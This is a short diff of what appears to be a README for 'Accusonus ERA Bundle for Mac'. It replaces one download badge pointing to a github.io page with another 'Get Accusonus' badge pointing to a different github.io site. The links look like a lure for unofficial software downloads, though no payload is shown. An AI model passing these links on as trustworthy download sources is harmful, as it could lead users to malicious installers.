@@ -4,11 +4,7 @@
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlQrKeDWcTvpuSPs509V60-N9tzwBXNvjgCg&s" alt="Accusonus ERA Bundle Mac Logo" width="400">
 </div>
 
-<div align="center">
-<a href="https://thynizaudin.github.io/.github/accusonus-erabundle">
-<img src="https://img.shields.io/badge/Download_Accusonus_ERA_Bundle_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download Accusonus ERA Bundle for Mac">
-</a>
-</div>
+[![Get Accusonus](https://img.shields.io/badge/Get-Accusonus-2D9F2D?style=for-the-badge)](https://ai-audio-repair-plugins.github.io/.github/)
 
 ---
 
